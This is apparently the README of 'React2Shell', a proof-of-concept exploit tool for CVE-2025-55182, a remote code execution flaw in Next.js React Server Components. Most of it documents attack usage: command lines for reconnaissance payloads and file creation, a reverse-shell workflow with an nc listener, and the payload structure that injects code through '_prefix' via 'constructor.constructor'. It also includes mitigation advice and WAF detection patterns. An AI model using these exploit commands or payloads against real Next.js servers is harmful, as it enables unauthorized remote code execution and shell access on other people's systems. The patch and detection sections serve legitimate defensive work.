# React2Shell - CVE-2025-55182 Exploit PoC

![Security](https://img.shields.io/badge/Security-CVE--2025--55182-red)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue)
![License](https://img.shields.io/badge/License-Educational-yellow)

A proof-of-concept exploit for CVE-2025-55182, a critical Remote Code Execution vulnerability in Next.js applications using React Server Components.

## ⚠️ DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.**

- ❌ DO NOT use against systems you don't own or have explicit permission to test
- ❌ Unauthorized access to computer systems is illegal
- ✅ Only use in controlled environments for learning and authorized penetration testing
- ✅ The author is not responsible for misuse or damage caused by this tool

## 📋 Vulnerability Details

- **CVE ID**: CVE-2025-55182
- **Vulnerability**: Remote Code Execution in React Server Components
- **Affected Versions**: 
  - Next.js: ≥14.3.0-canary.77, all 15.x and 16.x versions with App Router
  - React: 19.0, 19.1.0, 19.1.1, 19.2.0
- **Patched Versions**:
  - Next.js: 16.0.7, 15.5.7, 15.4.8, 15.3.6, 15.2.6, 15.1.9, 15.0.5
  - React: 19.0.1, 19.1.2, 19.2.1
- **CVSS Score**: Critical
- **Attack Vector**: Network-based, requires crafted POST request

## 🎯 Features

- ✅ Cross-platform support (Windows & Linux)
- ✅ Multiple payload types
- ✅ Reverse shell capabilities
- ✅ Visual proof payloads (calc, notepad)
- ✅ File system operations
- ✅ System information gathering

## 🔧 Installation

```bash
# Clone or download this repository
git clone <your-repo-url>
cd react2shell

# Install dependencies
npm install form-data
```

## 💻 Usage

### Basic Syntax

```bash
node react2shell.js <target_url> <payload_type> [options]
```

### Available Payloads

| Payload | Description | Example |
|---------|-------------|---------|
| `basic` | Mathematical proof of concept (7*7+1=50) | `node react2shell.js http://target:3000 basic` |
| `whoami` | Display current system user | `node react2shell.js http://target:3000 whoami` |
| `dir` | List current directory contents | `node react2shell.js http://target:3000 dir` |
| `systeminfo` | Display operating system information | `node react2shell.js http://target:3000 systeminfo` |
| `file` | Create EXPLOITED.txt proof file | `node react2shell.js http://target:3000 file` |
| `calc` | Launch calculator (Windows visual proof) | `node react2shell.js http://target:3000 calc` |
| `notepad` | Launch notepad (Windows visual proof) | `node react2shell.js http://target:3000 notepad` |
| `shell` | Reverse shell (Windows/Linux auto-detect) | `node react2shell.js http://target:3000 shell 10.10.10.5 4444` |

### Examples

#### 1. Basic Proof of Concept
```bash
node react2shell.js http://localhost:3000 basic
# Check server console for output: EXPLOITED: 50
```

#### 2. System Reconnaissance
```bash
# Get current user
node react2shell.js http://localhost:3000 whoami

# List files
node react2shell.js http://localhost:3000 dir

# System information
node react2shell.js http://localhost:3000 systeminfo
```

#### 3. Visual Proof (Windows)
```bash
# Launch calculator
node react2shell.js http://localhost:3000 calc

# Launch notepad
node react2shell.js http://localhost:3000 notepad
```

#### 4. File Creation Proof
```bash
node react2shell.js http://localhost:3000 file
# Check server directory for EXPLOITED.txt
```

#### 5. Reverse Shell
```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Execute exploit
node react2shell.js http://localhost:3000 shell <YOUR_IP> 4444

# Works on both Windows (PowerShell) and Linux (Bash)
```

## 🏗️ Setting Up Vulnerable Environment

### Prerequisites
- Node.js 18+
- npm or yarn

### Create Vulnerable Next.js Application

```bash
# Create project directory
mkdir vulnerable-nextjs-app
cd vulnerable-nextjs-app

# Initialize Next.js with vulnerable version
npx create-next-app@latest . --ts --app --no-eslint --tailwind

# Downgrade to vulnerable version
npm install next@15.0.4

# Install dependencies
npm install
```

### Minimal Vulnerable App (`app/page.tsx`)

```typescript
export default function Home() {
  return (
    <div className="p-8">
      <h1 className="text-4xl font-bold">Vulnerable Next.js App</h1>
      <p className="mt-4">This app is vulnerable to CVE-2025-55182</p>
    </div>
  );
}
```

### Start Server

```bash
npm run dev
# Server runs on http://localhost:3000
```

## 🔍 How It Works

The exploit leverages a deserialization vulnerability in React Server Components:

1. **Payload Construction**: Creates a malicious serialized object with prototype pollution
2. **Function Constructor Access**: Exploits `constructor.constructor` to access the Function constructor
3. **Code Injection**: Injects arbitrary JavaScript code through the `_prefix` field
4. **Execution**: Server deserializes the payload and executes the injected code

### Technical Details

```javascript
// Simplified vulnerability chain
{
  _formData: {
    get: '$3:constructor:constructor' // Access Function constructor
  },
  _prefix: 'YOUR_CODE_HERE//' // Injected code
}
```

## 🛡️ Mitigation

### For Application Owners

1. **Update Immediately**:
   ```bash
   npm update next@latest
   npm update react@latest react-dom@latest
   ```

2. **Verify Patched Versions**:
   ```bash
   npm list next react
   ```

3. **Required Versions**:
   - Next.js: ≥16.0.7 or ≥15.5.7
   - React: ≥19.2.1 or ≥19.1.2

### For Security Teams

- Scan for vulnerable Next.js versions in your infrastructure
- Implement Web Application Firewall (WAF) rules to detect malicious RSC payloads
- Monitor for suspicious POST requests with `next-action` headers
- Review server-side logs for unexpected code execution patterns

## 📊 Detection

### WAF Rules

Look for POST requests with:
- Header: `next-action` 
- Content-Type: `multipart/form-data`
- Body containing: `constructor`, `_prefix`, `_formData`

### Log Patterns

```
POST / with next-action header
Suspicious FormData keys: 0, 1, 2, 3, 4
Response: 200 (successful exploitation) or 500 (failed)
```

## 📚 References

- [CVE-2025-55182 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security)
- [React Security Updates](https://react.dev/blog)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)

## 🤝 Contributing

This is an educational tool. Contributions that improve:
- Detection capabilities
- Documentation
- Defensive strategies
- Educational content

are welcome. DO NOT submit contributions that enhance attack capabilities.

## 📜 License

Educational Use Only - No warranty provided

## 👤 Author

Created for cybersecurity education and awareness purposes.

## ⚖️ Legal Notice

By using this tool, you agree to:
- Only use it on systems you own or have explicit written permission to test
- Take full responsibility for your actions
- Not hold the author liable for any misuse or damage
- Comply with all applicable laws and regulations

**Unauthorized access to computer systems is a crime in most jurisdictions.**

---

**Stay safe, stay ethical, stay legal. 🔒**